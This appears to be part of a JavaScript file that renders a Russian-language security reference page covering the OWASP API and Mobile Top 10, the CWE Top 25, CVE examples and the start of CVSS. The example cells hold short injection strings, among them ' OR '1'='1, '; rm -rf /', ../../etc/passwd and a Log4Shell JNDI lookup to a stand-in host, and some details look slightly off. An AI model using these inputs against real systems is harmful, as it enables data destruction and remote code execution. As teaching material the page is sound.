                      <td><strong>API3: Excessive Data Exposure</strong></td>
                      <td>API возвращает больше данных, чем необходимо, включая конфиденциальные, из-за отсутствия фильтрации на сервере (например, пароли или SSN).</td>
                      <td>API /api/users/123 возвращает полный профиль пользователя, включая пароли или SSN (номер социального страхования), вместо ограниченного набора данных.</td>
                      <td>- Фильтровать данные на серверной стороне, возвращать только необходимые поля.<br>- Использовать схемы API (например, OpenAPI) для определения возвращаемых данных.<br>- Применять принцип наименьших привилегий для данных.</td>
                    </tr>
                    <tr>
                      <td><strong>API4: Lack of Resources & Rate Limiting</strong></td>
                      <td>Отсутствие ограничений на количество запросов к API, что позволяет злоумышленникам перегрузить сервер (DoS-атаки) или выполнять брутфорс.</td>
                      <td>Злоумышленник отправляет тысячи запросов к /api/login, перегрузка сервера или подбор пароля.</td>
                      <td>- Включить Rate Limiting на API Gateway (например, AWS API Gateway, Kong) для управления трафиком.<br>- Мониторить нагрузку и настраивать оповещения на аномалии.</td>
                    </tr>
                    <tr>
                      <td><strong>API5: Broken Function Level Authorization</strong></td>
                      <td>Отсутствие проверки прав на выполнение функций API, что позволяет злоумышленникам вызывать функции, для которых у них нет доступа.</td>
                      <td>Пользователь без прав администратора вызывает /api/admin/delete и удаляет данные.</td>
                      <td>- Проверять права доступа для каждой функции API на серверной стороне.<br>- Использовать RBAC/ABAC для управления доступом.<br>- Логировать действия для аудита и обнаружения аномалий.</td>
                    </tr>
                    <tr>
                      <td><strong>API6: Mass Assignment</strong></td>
                      <td>API позволяет злоумышленнику изменять поля объекта, которые не должны быть доступны для обновления, из-за автоматической привязки данных (mass assignment).</td>
                      <td>Злоумышленник добавляет isAdmin=true в запрос /api/users/update и получает права администратора.</td>
                      <td>- Использовать строгие схемы валидации (например, JSON Schema).<br>- Избегать автоматической привязки данных без фильтрации.<br>- Ограничить обновляемые поля в API.</td>
                    </tr>
                    <tr>
                      <td><strong>API7: Security Misconfiguration</strong></td>
                      <td>Неправильная конфигурация API, такая как открытые порты, включённые отладочные сообщения или слабые настройки безопасности.</td>
                      <td>API-ключи из-за слабой конфигурации API (например, API-ключи в открытом доступе).</td>
                      <td>- Отключать отладочные сообщения в продакшене.<br>- Использовать CORS, заголовки безопасности (например, Content-Security-Policy).<br>- Проводить регулярный аудит конфигурации (например, с помощью OWASP ZAP).</td>
                    </tr>
                    <tr>
                      <td><strong>API8: Injection</strong></td>
                      <td>Введение вредоносного кода (SQL, NoSQL, OS Command) через параметры API из-за недостаточной валидации ввода.</td>
                      <td>Введение SQL-инъекции через параметр: /api/search?query=1' OR '1'='1, что позволяет всё списать.</td>
                      <td>- Использовать параметризованные запросы (Prepared Statements).<br>- Экранировать и валидировать ввод (например, с помощью библиотек).<br>- Применить ORM (например, Hibernate, Sequelize) для защиты от инъекций.</td>
                    </tr>
                    <tr>
                      <td><strong>API9: Improper Assets Management</strong></td>
                      <td>Отсутствие управления версиями API или оставление в доступе устаревшие тестовые API, которые могут быть использованы злоумышленником.</td>
                      <td>Злоумышленник находит старую версию API /v1/users с уязвимостью, которая была исправлена в /v2/users.</td>
                      <td>- Документировать и управлять всеми версиями API.<br>- Отключить устаревые API или ограничить к ним доступ.<br>- Использовать заголовки о прекращении поддержки для устаревших API.</td>
                    </tr>
                    <tr>
                      <td><strong>API10: Insufficient Logging & Monitoring</strong></td>
                      <td>Недостаточное логирование и мониторинг активности API, что затрудняет обнаружение и реагирование на атаки.</td>
                      <td>Атака брутфорса на /api/login не обнаруживается из-за отсутствия логов или политики реагирования.</td>
                      <td>- Включить логирование всех запросов и ошибок API.<br>- Настроить мониторинг через SIEM (например, Splunk, ELK).<br>- Использовать оповещения для обнаружения аномалий (например, чрезмерное количество ошибок 401).</td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>
          </div>

          <!-- OWASP Mobile Top 10 (2016) -->
          <div class="accordion-item">
            <button class="accordion-header">OWASP Mobile Top 10 (2016)</button>
            <div class="accordion-content">
              <div class="osi-table-container">
                <table class="osi-table">
                  <thead>
                    <tr>
                      <th>Категория</th>
                      <th>Описание</th>
                      <th>Пример атаки</th>
                      <th>Методы предотвращения</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr>
                      <td><strong>M1: Improper Platform Usage</strong></td>
                      <td>Неправильное использование платформы (Android/iOS).</td>
                      <td>Использование небезопасного API Android.</td>
                      <td>Следовать рекомендациям платформы API, избегать небезопасных API.</td>
                    </tr>
                    <tr>
                      <td><strong>M2: Insecure Data Storage</strong></td>
                      <td>Небезопасное хранение данных (например, паролей в открытом виде).</td>
                      <td>Пароль в SQLite без шифрования.</td>
                      <td>Использовать шифрование (AES), использовать безопасное хранилище (Keychain на iOS, Keystore на Android).</td>
                    </tr>
                    <tr>
                      <td><strong>M3: Insecure Communication</strong></td>
                      <td>Передача данных без шифрования (например, через HTTP).</td>
                      <td>Перехват пароля через HTTP.</td>
                      <td>Использовать HTTPS, закреплять сертификаты (Certificate Pinning).</td>
                    </tr>
                    <tr>
                      <td><strong>M4: Insecure Authentication</strong></td>
                      <td>Проблемы с аутентификацией (например, отсутствие проверки на стороне сервера).</td>
                      <td>Аутентификация только на устройстве.</td>
                      <td>Проверять аутентификацию на сервере, использовать токены (JWT), MFA.</td>
                    </tr>
                    <tr>
                      <td><strong>M5: Insufficient Cryptography</strong></td>
                      <td>Слабая или неправильная криптография (например, MD5 вместо AES).</td>
                      <td>Использование MD5 вместо AES.</td>
                      <td>Использовать современные алгоритмы (AES-256), правильно управлять ключами.</td>
                    </tr>
                    <tr>
                      <td><strong>M6: Insecure Authorization</strong></td>
                      <td>Неправильная авторизация, доступ к чужим данным.</td>
                      <td>Получение чужого ID в запросе.</td>
                      <td>Проверять права доступа на сервере, использовать RBAC (Role-Based Access Control).</td>
                    </tr>
                    <tr>
                      <td><strong>M7: Client Code Quality</strong></td>
                      <td>Уязвимости в коде клиента (например, отсутствие проверки ввода).</td>
                      <td>Введение переполнения в мобильном приложении.</td>
                      <td>Использовать безопасный код, использовать статический анализ (например, SonarQube).</td>
                    </tr>
                    <tr>
                      <td><strong>M8: Code Tampering</strong></td>
                      <td>Модификация кода приложения злоумышленником.</td>
                      <td>Введение вредоносного кода в APK.</td>
                      <td>Использовать обфускацию кода (ProGuard), проверять целостность кода.</td>
                    </tr>
                    <tr>
                      <td><strong>M9: Reverse Engineering</strong></td>
                      <td>Обратная разработка приложения для получения доступа к секретам.</td>
                      <td>Декомпиляция APK для извлечения API-ключа.</td>
                      <td>Использовать обфускацию, хранить секреты в безопасном месте.</td>
                    </tr>
                    <tr>
                      <td><strong>M10: Extraneous Functionality</strong></td>
                      <td>Наличие скрытых функций, которые могут быть использованы злоумышленником.</td>
                      <td>Скрытый объект в приложении.</td>
                      <td>Удалять тестовый код перед релизом, проверять код.</td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        </div>
      </div>
    `;

    document.querySelector('.back-btn').addEventListener('click', () => {
      loadVulnerabilitiesContent(container);
    });

    const accordionHeaders = document.querySelectorAll('.accordion-header');
    accordionHeaders.forEach(header => {
      header.addEventListener('click', () => {
        const content = header.nextElementSibling;
        const isOpen = content.style.display === 'block';

        document.querySelectorAll('.accordion-content').forEach(item => {
          item.style.display = 'none';
        });

        content.style.display = isOpen ? 'none' : 'block';
      });
    });
}

function loadCweContent(container) {
    container.innerHTML = `
      <div class="vulnerabilities-container">
        <button class="back-btn">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <line x1="19" y1="12" x2="5" y2="12"></line>
            <polyline points="12 19 5 12 12 5"></polyline>
          </svg>
          Назад
        </button>
        <h1>CWE (Common Weakness Enumeration)</h1>
        <div class="cwe-description">
          <p><strong>CWE (Common Weakness Enumeration)</strong> — это система классификации слабостей программного обеспечения, разработанная MITRE. CWE предоставляет уникальные идентификаторы (CWE ID) для различных типов слабостей, которые могут привести к уязвимостям в программном обеспечении. Основная цель CWE — помочь разработчикам, тестировщикам и специалистам по безопасности выявлять, классифицировать и устранять слабости в коде и архитектуре приложений.</p>

          <h2>Зачем нужен CWE?</h2>
          <p>CWE играет важную роль в обеспечении безопасности программного обеспечения по следующим причинам:</p>
          <ul>
            <li><strong>Классификация слабостей:</strong> CWE предоставляет структурированный список слабостей, что упрощает их идентификацию и анализ.</li>
            <li><strong>Улучшение качества кода:</strong> Использование CWE помогает разработчикам избегать типичных ошибок, которые могут привести к уязвимостям.</li>
            <li><strong>Стандартизация:</strong> CWE является общепринятым стандартом, который используется в инструментах анализа кода, аудитах и сертификациях.</li>
            <li><strong>Обучение:</strong> CWE помогает обучать разработчиков и специалистов по безопасности, предоставляя примеры слабостей и методы их предотвращения.</li>
            <li><strong>Связь с CVE:</strong> CWE часто используется в связке с CVE (Common Vulnerabilities and Exposures) для анализа уязвимостей, указывая на их первопричины (слабости).</li>
          </ul>

          <h2>История CWE</h2>
          <p>CWE был впервые представлен MITRE в 2006 году как часть инициативы по улучшению безопасности программного обеспечения. Проект развивался совместно с сообществом специалистов по безопасности, включая компании, такие как Apple, Microsoft и IBM. Список CWE Top 25, публикуемый ежегодно, основан на данных о реальных уязвимостях (CVE) и анализе их первопричин. CWE интегрирован в такие стандарты, как NIST NVD (National Vulnerability Database) и OWASP, что делает его важным инструментом в индустрии.</p>

          <h2>Как используется CWE?</h2>
          <p>CWE применяется на разных этапах жизненного цикла разработки программного обеспечения (SDLC):</p>
          <ul>
            <li><strong>Разработка:</strong> Разработчики используют CWE для написания безопасного кода, избегая типичных слабостей (например, CWE-79: XSS).</li>
            <li><strong>Тестирование:</strong> Инструменты статического и динамического анализа (например, SonarQube, Checkmarx) используют CWE для выявления слабостей в коде.</li>
            <li><strong>Аудит:</strong> Специалисты по безопасности используют CWE Top 25 для приоритизации уязвимостей при аудите приложений.</li>
            <li><strong>Обучение:</strong> CWE используется в образовательных программах для обучения разработчиков и специалистов по безопасности.</li>
            <li><strong>Связь с CVE:</strong> CWE помогает связать конкретные уязвимости (CVE) с их первопричинами, что упрощает устранение проблем.</li>
          </ul>

          <h2>Преимущества CWE</h2>
          <p>Использование CWE приносит следующие преимущества:</p>
          <ul>
            <li><strong>Универсальность:</strong> CWE охватывает широкий спектр слабостей, применимых к различным языкам программирования и технологиям.</li>
            <li><strong>Доступность:</strong> CWE является бесплатным и открытым ресурсом, доступным для всех.</li>
            <li><strong>Интеграция:</strong> CWE интегрирован с другими системами, такими как CVE, CVSS и OWASP, что упрощает анализ уязвимостей.</li>
            <li><strong>Приоритизация:</strong> Список CWE Top 25 помогает сосредоточиться на наиболее опасных слабостях, основанных на реальных данных.</li>
            <li><strong>Профилактика:</strong> CWE помогает предотвратить уязвимости на этапе разработки, а не устранять их после эксплуатации.</li>
          </ul>

          <h2>Области применения</h2>
          <p>CWE используется в различных сценариях:</p>
          <ul>
            <li><strong>Анализ кода:</strong> Выявление слабостей в коде с помощью инструментов, таких как SonarQube или Fortify.</li>
            <li><strong>Управление уязвимостями:</strong> Связь CWE с CVE для анализа первопричин уязвимостей.</li>
            <li><strong>Разработка стандартов:</strong> Использование CWE в стандартах безопасности, таких как NIST, ISO 27001 и OWASP.</li>
            <li><strong>Обучение:</strong> Проведение тренингов для разработчиков с использованием CWE Top 25.</li>
            <li><strong>Аудит:</strong> Оценка безопасности приложений на основе списка CWE Top 25.</li>
          </ul>

          <p>Ниже представлен список <strong>CWE Top 25 (2023)</strong> — 25 наиболее опасных слабостей программного обеспечения, составленный на основе анализа данных CVE и их первопричин. Этот список помогает разработчикам и специалистам по безопасности сосредоточиться на ключевых рисках.</p>
        </div>

        <div class="osi-table-container">
          <table class="osi-table">
            <thead>
              <tr>
                <th>CWE ID</th>
                <th>Название</th>
                <th>Описание</th>
                <th>Пример</th>
                <th>Методы предотвращения</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td><strong>CWE-787</strong></td>
                <td>Out-of-Bounds Write</td>
                <td>Программа записывает данные за пределы выделенного буфера памяти (например, переполнение буфера).</td>
                <td>Переполнение буфера в C: <code>strcpy(buffer, oversized_input)</code>.</td>
                <td>Использовать безопасные функции (например, <code>strncpy</code>), проверять границы массивов.</td>
              </tr>
              <tr>
                <td><strong>CWE-79</strong></td>
                <td>Cross-Site Scripting (XSS)</td>
                <td>Внедрение вредоносного скрипта в веб-страницу из-за недостаточной нейтрализации ввода.</td>
                <td><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> в поле ввода формы.</td>
                <td>Экранировать ввод, использовать Content-Security-Policy, применять фреймворки (React).</td>
              </tr>
              <tr>
                <td><strong>CWE-89</strong></td>
                <td>SQL Injection</td>
                <td>Внедрение SQL-кода через пользовательский ввод.</td>
                <td><code>SELECT * FROM users WHERE id = '1' OR '1'='1'</code> в поле ввода.</td>
                <td>Использовать подготовленные выражения (Prepared Statements), валидировать ввод.</td>
              </tr>
              <tr>
                <td><strong>CWE-20</strong></td>
                <td>Improper Input Validation</td>
                <td>Отсутствие проверки пользовательского ввода, что приводит к некорректной обработке данных.</td>
                <td>Ввод некорректных данных (<code>; DROP TABLE users; --</code>) вызывает сбой.</td>
                <td>Проверять и валидировать ввод (регулярные выражения), использовать белые списки.</td>
              </tr>
              <tr>
                <td><strong>CWE-125</strong></td>
                <td>Out-of-Bounds Read</td>
                <td>Чтение данных за пределами выделенного буфера памяти.</td>
                <td>Чтение за пределами массива: <code>array[-1]</code> или <code>array[oversized_index]</code>.</td>
                <td>Проверять границы массивов, использовать безопасные функции для чтения данных.</td>
              </tr>
              <tr>
                <td><strong>CWE-78</strong></td>
                <td>OS Command Injection</td>
                <td>Выполнение команд ОС через пользовательский ввод.</td>
                <td><code>; rm -rf /</code> в поле ввода команды.</td>
                <td>Экранировать ввод, избегать выполнения команд ОС, использовать API вместо команд.</td>
              </tr>
              <tr>
                <td><strong>CWE-416</strong></td>
                <td>Use After Free</td>
                <td>Использование памяти после её освобождения, что может привести к сбоям или эксплуатации.</td>
                <td>Доступ к указателю после <code>free()</code>: <code>free(ptr); *ptr = 1;</code>.</td>
                <td>Использовать безопасное управление памятью, проверять указатели перед использованием.</td>
              </tr>
              <tr>
                <td><strong>CWE-22</strong></td>
                <td>Path Traversal</td>
                <td>Доступ к файлам вне разрешённой директории через манипуляцию путей.</td>
                <td><code>../../etc/passwd</code> в URL.</td>
                <td>Проверять пути, использовать белые списки для доступа к файлам, нормализовать пути.</td>
              </tr>
              <tr>
                <td><strong>CWE-352</strong></td>
                <td>Cross-Site Request Forgery (CSRF)</td>
                <td>Выполнение нежелательных действий от имени пользователя без его ведома.</td>
                <td>Форма отправляет запрос без проверки токена.</td>
                <td>Использовать CSRF-токены, проверять заголовок Origin, требовать повторную аутентификацию.</td>
              </tr>
              <tr>
                <td><strong>CWE-434</strong></td>
                <td>Unrestricted Upload of File with Dangerous Type</td>
                <td>Загрузка вредоносных файлов (например, скриптов) без проверки типа.</td>
                <td>Загрузка PHP-скрипта (<code>malicious.php</code>) через форму.</td>
                <td>Ограничить типы файлов, проверять содержимое, хранить файлы вне веб-доступа.</td>
              </tr>
              <tr>
                <td><strong>CWE-476</strong></td>
                <td>NULL Pointer Dereference</td>
                <td>Разыменование нулевого указателя, что приводит к сбою программы.</td>
                <td><code>int *ptr = NULL; *ptr = 5;</code></td>
                <td>Проверять указатели на NULL перед использованием, использовать современные языки (Rust).</td>
              </tr>
              <tr>
                <td><strong>CWE-287</strong></td>
                <td>Improper Authentication</td>
                <td>Ошибки аутентификации, позволяющие обойти проверку (например, слабые пароли).</td>
                <td>Обход аутентификации через отсутствие проверки токена.</td>
                <td>Использовать MFA, проверять учётные данные на сервере, хранить пароли в хэшах (bcrypt).</td>
              </tr>
              <tr>
                <td><strong>CWE-190</strong></td>
                <td>Integer Overflow or Wraparound</td>
                <td>Переполнение целочисленных значений, приводящее к некорректным вычислениям.</td>
                <td><code>int x = INT_MAX; x++;</code> приводит к отрицательному значению.</td>
                <td>Проверять границы чисел, использовать безопасные типы данных (например, BigInteger).</td>
              </tr>
              <tr>
                <td><strong>CWE-502</strong></td>
                <td>Deserialization of Untrusted Data</td>
                <td>Десериализация данных от ненадёжного источника, что может привести к выполнению кода.</td>
                <td>Десериализация вредоносного объекта через JSON (pickle в Python).</td>
                <td>Избегать десериализации непроверенных данных, использовать безопасные библиотеки (Jackson).</td>
              </tr>
              <tr>
                <td><strong>CWE-77</strong></td>
                <td>Command Injection</td>
                <td>Внедрение команд через пользовательский ввод (аналог OS Command Injection, но шире).</td>
                <td>Внедрение команды <code>&& shutdown</code> в параметр ввода.</td>
                <td>Экранировать ввод, использовать безопасные API, избегать выполнения команд.</td>
              </tr>
              <tr>
                <td><strong>CWE-119</strong></td>
                <td>Improper Restriction of Operations within the Bounds of a Memory Buffer</td>
                <td>Ошибки работы с памятью (переполнение или недоступ к буферу).</td>
                <td>Переполнение буфера: <code>memcpy(buffer, data, oversized_length)</code>.</td>
                <td>Использовать безопасные функции (<code>memcpy_s</code>), проверять размеры буфера.</td>
              </tr>
              <tr>
                <td><strong>CWE-798</strong></td>
                <td>Use of Hard-coded Credentials</td>
                <td>Использование жёстко закодированных учётных данных (например, паролей в коде).</td>
                <td><code>String password = "admin123";</code> в коде.</td>
                <td>Хранить учётные данные в безопасных хранилищах (Vault), использовать переменные окружения.</td>
              </tr>
              <tr>
                <td><strong>CWE-306</strong></td>
                <td>Missing Authentication for Critical Function</td>
                <td>Отсутствие аутентификации для критических функций.</td>
                <td>Доступ к админ-панели без логина.</td>
                <td>Требовать аутентификацию для всех критических операций, использовать RBAC.</td>
              </tr>
              <tr>
                <td><strong>CWE-862</strong></td>
                <td>Missing Authorization</td>
                <td>Отсутствие проверки прав доступа к ресурсам.</td>
                <td>Пользователь меняет <code>user_id</code> в запросе и видит чужие данные.</td>
                <td>Проверять права доступа на сервере, использовать модели авторизации (RBAC, ABAC).</td>
              </tr>
              <tr>
                <td><strong>CWE-276</strong></td>
                <td>Incorrect Default Permissions</td>
                <td>Неправильные разрешения по умолчанию, позволяющие несанкционированный доступ.</td>
                <td>Файл конфигурации доступен всем пользователям (<code>chmod 777</code>).</td>
                <td>Устанавливать минимальные разрешения, проверять доступ при установке.</td>
              </tr>
              <tr>
                <td><strong>CWE-284</strong></td>
                <td>Improper Access Control</td>
                <td>Общие проблемы с контролем доступа, позволяющие несанкционированный доступ.</td>
                <td>Доступ к API без проверки прав.</td>
                <td>Использовать строгие политики доступа, проверять права на сервере.</td>
              </tr>
              <tr>
                <td><strong>CWE-200</strong></td>
                <td>Exposure of Sensitive Information to an Unauthorized Actor</td>
                <td>Утечка конфиденциальной информации (например, логов с паролями).</td>
                <td>Пароли в логах: <code>logger.info("Password: " + password);</code>.</td>
                <td>Не логировать чувствительные данные, использовать шифрование, ограничивать доступ.</td>
              </tr>
              <tr>
                <td><strong>CWE-522</strong></td>
                <td>Insufficiently Protected Credentials</td>
                <td>Недостаточная защита учётных данных (например, пароли в открытом виде).</td>
                <td>Пароль передаётся в URL: <code>http://site.com?password=123</code>.</td>
                <td>Шифровать учётные данные, использовать безопасные протоколы (HTTPS), токены.</td>
              </tr>
              <tr>
                <td><strong>CWE-732</strong></td>
                <td>Incorrect Permission Assignment for Critical Resource</td>
                <td>Неправильное назначение разрешений для критических ресурсов.</td>
                <td>Каталог с конфигурацией доступен для записи всем пользователям.</td>
                <td>Проверять и ограничивать разрешения, использовать принцип наименьших привилегий.</td>
              </tr>
              <tr>
                <td><strong>CWE-1275</strong></td>
                <td>Sensitive Cookie with Improper SameSite Attribute</td>
                <td>Неправильная настройка атрибута SameSite в cookies, что может привести к CSRF.</td>
                <td>Cookie без <code>SameSite=Strict</code>, уязвим к CSRF.</td>
                <td>Устанавливать <code>SameSite=Strict</code> или <code>Lax</code>, использовать CSRF-токены.</td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>
    `;

    document.querySelector('.back-btn').addEventListener('click', () => {
      loadVulnerabilitiesContent(container);
    });
}

function loadCveContent(container) {
    container.innerHTML = `
      <div class="vulnerabilities-container">
        <button class="back-btn">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <line x1="19" y1="12" x2="5" y2="12"></line>
            <polyline points="12 19 5 12 12 5"></polyline>
          </svg>
          Назад
        </button>
        <h1>CVE (Common Vulnerabilities and Exposures)</h1>
        <div class="cve-description">
          <p><strong>CVE (Common Vulnerabilities and Exposures)</strong> — это система, которая предоставляет уникальные идентификаторы (CVE-ID) для известных уязвимостей в программном обеспечении, оборудовании и системах. CVE была создана для стандартизации процесса идентификации и обмена информацией об уязвимостях, что позволяет организациям и специалистам по безопасности эффективно управлять рисками.</p>

          <h2>Зачем нужен CVE?</h2>
          <p>CVE необходим для обеспечения безопасности программного обеспечения и систем по следующим причинам:</p>
          <ul>
            <li><strong>Стандартизация:</strong> CVE предоставляет единый идентификатор для каждой уязвимости, что упрощает её отслеживание и обсуждение.</li>
            <li><strong>Обмен информацией:</strong> CVE позволяет организациям, исследователям и вендорам обмениваться данными об уязвимостях через базы данных, такие как NVD.</li>
            <li><strong>Управление рисками:</strong> CVE помогает организациям приоритизировать уязвимости на основе их критичности и доступных эксплойтов.</li>
            <li><strong>Автоматизация:</strong> CVE используется в инструментах сканирования и управления уязвимостями для автоматического обнаружения проблем.</li>
            <li><strong>Соответствие требованиям:</strong> Использование CVE помогает соответствовать стандартам безопасности, таким как PCI DSS и ISO 27001.</li>
          </ul>

          <h2>История CVE</h2>
          <p>CVE был создан MITRE в 1999 году для стандартизации идентификации уязвимостей. Первоначально проект был направлен на упрощение обмена информацией между исследователями и вендорами. С 2005 года CVE интегрирован с National Vulnerability Database (NVD), которая добавляет к CVE-ID дополнительную информацию, такую как CVSS-оценки и ссылки на патчи. Сегодня CVE поддерживается MITRE и используется по всему миру как основа для управления уязвимостями.</p>

          <h2>Как используется CVE?</h2>
          <p>CVE применяется в различных аспектах кибербезопасности:</p>
          <ul>
            <li><strong>Идентификация уязвимостей:</strong> CVE-ID используется для точного определения уязвимостей в базах данных, таких как NVD.</li>
            <li><strong>Сканирование систем:</strong> Инструменты, такие как Nessus или Qualys, используют CVE для поиска уязвимостей в системах.</li>
            <li><strong>Управление патчами:</strong> Организации используют CVE для определения, какие уязвимости требуют немедленного устранения.</li>
            <li><strong>Анализ угроз:</strong> CVE связывается с MITRE ATT&CK для анализа тактик и техник, используемых в атаках.</li>
            <li><strong>Отчётность:</strong> CVE используется в отчётах об инцидентах для документирования обнаруженных уязвимостей.</li>
          </ul>

          <h2>Как CVE помогает в управлении уязвимостями?</h2>
          <p>CVE играет ключевую роль в управлении уязвимостями, предоставляя следующие возможности:</p>
          <ul>
            <li><strong>Приоритизация:</strong> CVE позволяет организациям сосредоточиться на наиболее опасных уязвимостях, особенно если они связаны с высокими CVSS-оценками или известными эксплойтами (например, <code>CVE-2021-44228</code> с публичным эксплойтом).</li>
            <li><strong>Планирование патчей:</strong> CVE помогает определить, какие уязвимости уже имеют доступные исправления, что позволяет планировать обновления (например, установка патча для <code>CVE-2023-20198</code> от Cisco).</li>
            <li><strong>Мониторинг угроз:</strong> CVE используется для отслеживания новых уязвимостей, которые могут затронуть системы, через подписки на уведомления NVD.</li>
            <li><strong>Управление инцидентами:</strong> При реагировании на инциденты CVE помогает быстро идентифицировать уязвимость, которая была использована (например, определение, что атака связана с <code>CVE-2021-34527</code>).</li>
            <li><strong>Обучение:</strong> CVE используется в тренингах для демонстрации реальных уязвимостей и их последствий, что помогает повысить осведомлённость сотрудников.</li>
          </ul>

          <h2>Процесс регистрации CVE</h2>
          <p>Процесс регистрации CVE включает несколько этапов:</p>
          <ul>
            <li><strong>Обнаружение уязвимости:</strong> Исследователь или вендор обнаруживает уязвимость в программном обеспечении (например, уязвимость в Log4j).</li>
            <li><strong>Подача заявки:</strong> Исследователь отправляет информацию об уязвимости в MITRE или через одного из CVE Numbering Authorities (CNA), таких как Microsoft или Cisco.</li>
            <li><strong>Проверка:</strong> MITRE или CNA проверяет информацию, чтобы убедиться, что уязвимость уникальна и не дублирует существующие записи.</li>
            <li><strong>Присвоение CVE-ID:</strong> После проверки уязвимости присваивается уникальный идентификатор (например, <code>CVE-2021-44228</code>).</li>
            <li><strong>Публикация:</strong> Информация о CVE публикуется в базе MITRE и передаётся в NVD для добавления дополнительной информации, такой как CVSS-оценка.</li>
          </ul>

          <h2>Связь CVE с другими стандартами</h2>
          <p>CVE тесно интегрируется с другими стандартами и системами:</p>
          <ul>
            <li><strong>CVSS:</strong> CVE используется вместе с CVSS для оценки критичности уязвимостей (например, <code>CVE-2021-44228</code> имеет CVSS 9.8).</li>
            <li><strong>CWE:</strong> CVE связывается с CWE для определения первопричин уязвимостей (например, <code>CVE-2021-44228</code> связан с <code>CWE-502</code> — Deserialization of Untrusted Data).</li>
            <li><strong>MITRE ATT&CK:</strong> CVE используется для анализа тактик и техник атак (например, <code>CVE-2021-44228</code> связан с T1190 — Exploit Public-Facing Application).</li>
            <li><strong>OWASP:</strong> CVE помогает идентифицировать уязвимости, входящие в OWASP Top 10, такие как инъекции или XSS.</li>
            <li><strong>NVD:</strong> National Vulnerability Database обогащает CVE-ID дополнительной информацией, включая ссылки на патчи и CVSS-оценки.</li>
          </ul>

          <h2>Преимущества CVE</h2>
          <p>Использование CVE приносит следующие преимущества:</p>
          <ul>
            <li><strong>Единый стандарт:</strong> CVE-ID обеспечивает единый язык для обсуждения уязвимостей, устраняя путаницу.</li>
            <li><strong>Доступность:</strong> Информация о CVE общедоступна через базы данных, такие как NVD, и бесплатна.</li>
            <li><strong>Интеграция:</strong> CVE интегрируется с другими системами, такими как CVSS, CWE и MITRE ATT&CK, для более глубокого анализа.</li>
            <li><strong>Автоматизация:</strong> CVE позволяет автоматизировать процессы сканирования и управления уязвимостями.</li>
            <li><strong>Глобальное признание:</strong> CVE признан мировым стандартом и используется вендорами, исследователями и организациями по всему миру.</li>
          </ul>

          <h2>Области применения</h2>
          <p>CVE используется в различных сценариях:</p>
          <ul>
            <li><strong>Управление уязвимостями:</strong> Определение и устранение уязвимостей в системах и приложениях.</li>
            <li><strong>Анализ рисков:</strong> Оценка критичности уязвимостей с помощью CVSS-оценок.</li>
            <li><strong>Патч-менеджмент:</strong> Приоритизация обновлений на основе CVE и доступных эксплойтов.</li>
            <li><strong>Исследования:</strong> Исследователи используют CVE для анализа новых уязвимостей и разработки эксплойтов.</li>
            <li><strong>Соответствие требованиям:</strong> Использование CVE в аудитах для выполнения нормативных требований.</li>
          </ul>

          <p>Ниже представлена таблица с примерами уязвимостей, зарегистрированных в CVE, их описанием, примерами применения и рекомендациями по защите.</p>
        </div>

        <div class="osi-table-container">
          <table class="osi-table">
            <thead>
              <tr>
                <th>Название уязвимости</th>
                <th>Описание</th>
                <th>Пример применения</th>
                <th>Рекомендации по защите</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td><strong>Log4Shell (<code>CVE-2021-44228</code>)</strong></td>
                <td>Уязвимость в библиотеке Log4j, позволяющая удалённое выполнение кода (RCE) через обработку вредоносных строк.</td>
                <td>Злоумышленник отправляет строку <code>jndi:ldap://malicious.com/a</code> в заголовок HTTP, что приводит к выполнению кода.</td>
                <td>Обновить Log4j до версии 2.16.0 или выше, отключить JNDI, если не используется, настроить WAF для фильтрации вредоносных запросов.</td>
              </tr>
              <tr>
                <td><strong>Cisco IOS Vulnerability (<code>CVE-2023-20198</code>)</strong></td>
                <td>Уязвимость в Cisco IOS, позволяющая удалённый доступ без аутентификации из-за ошибки в обработке запросов.</td>
                <td>Злоумышленник использует уязвимость для получения доступа к устройству Cisco IOS без ввода учётных данных.</td>
                <td>Установить патч от Cisco, ограничить доступ к устройству через ACL, включить мониторинг аномалий.</td>
              </tr>
              <tr>
                <td><strong>PrintNightmare (<code>CVE-2021-34527</code>)</strong></td>
                <td>Уязвимость в службе печати Windows, позволяющая удалённое выполнение кода с правами SYSTEM.</td>
                <td>Злоумышленник отправляет вредоносный драйвер печати, что приводит к выполнению кода на сервере Windows.</td>
                <td>Установить обновление от Microsoft, отключить службу печати на уязвимых серверах, ограничить доступ к RPC.</td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>
    `;

    document.querySelector('.back-btn').addEventListener('click', () => {
      loadVulnerabilitiesContent(container);
    });
}

function loadCvssContent(container) {
    container.innerHTML = `
      <div class="vulnerabilities-container">
        <button class="back-btn">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <line x1="19" y1="12" x2="5" y2="12"></line>
            <polyline points="12 19 5 12 12 5"></polyline>
          </svg>
          Назад
        </button>
        <h1>CVSS (Common Vulnerability Scoring System)</h1>
        <div class="cvss-description">
          <p><strong>CVSS (Common Vulnerability Scoring System)</strong> — это стандартная система оценки критичности уязвимостей, которая присваивает уязвимостям числовую оценку от 0 до 10 на основе их характеристик. CVSS помогает организациям приоритизировать уязвимости, оценивая их потенциальное воздействие и сложность эксплуатации.</p>

          <h2>Зачем нужен CVSS?</h2>
          <p>CVSS необходим для управления уязвимостями по следующим причинам:</p>
          <ul>
            <li><strong>Приоритизация:</strong> CVSS позволяет определить, какие уязвимости требуют немедленного устранения, на основе их критичности.</li>
            <li><strong>Стандартизация:</strong> CVSS предоставляет единый метод оценки уязвимостей, признанный во всём мире.</li>
            <li><strong>Оценка рисков:</strong> CVSS учитывает как технические характеристики уязвимости, так и её контекст в конкретной среде.</li>
            <li><strong>Автоматизация:</strong> CVSS используется в инструментах управления уязвимостями для автоматической оценки рисков.</li>
